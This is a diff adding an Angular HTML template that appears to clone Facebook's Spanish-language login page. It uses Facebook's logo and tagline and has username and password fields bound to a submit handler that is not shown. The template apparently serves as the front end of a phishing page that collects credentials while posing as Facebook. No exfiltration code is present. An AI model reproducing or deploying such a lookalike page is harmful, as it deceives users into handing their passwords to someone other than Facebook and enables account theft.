@@ -1,0 +1,43 @@
+<div class="myNav">
+    <div class="content">
+        <ngx-spinner bdColor = "rgba(0, 0, 0, 0.8)" size = "medium" color = "#fff" type = "ball-clip-rotate" [fullScreen] = "true"><p style="color: white" > Loading... </p></ngx-spinner>
+        <div class="content2">
+            <div class="content3">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="">
+            </div>
+            <h2>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
+        </div>
+        <div class="content4">
+            <div class="content5">
+                <div class="content6">
+                    <form [formGroup]="form" (ngSubmit)="onSubmit(form.value)">
+                        <div>
+                            <div class="content6-1">
+                                <input type="text" class="content6-3" placeholder="Correo electrónico o número de teléfono" formControlName="username">
+                            </div>
+                            <div class="content6-1">
+                                <input type="password" class="content6-3" placeholder="Contraseña" formControlName="password">
+                            </div>
+                            
+                        </div>
+                        <div class="content7">
+                            <button type="submit">Iniciar sesión</button>
+                        </div>
+                        <div class="content8">
+                            <a href="">¿Olvidaste tu contraseña?</a>
+                        </div>
+                        <div class="content9"></div>
+                        <div class="content10">
+
+                            <a href="">Crear cuenta nueva</a>
+                        </div>
+
+                    </form>
+                </div>
+                <div class="content11">
+                    <a href="">Crea una página</a> para una celebridad, una marca o un negocio.
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
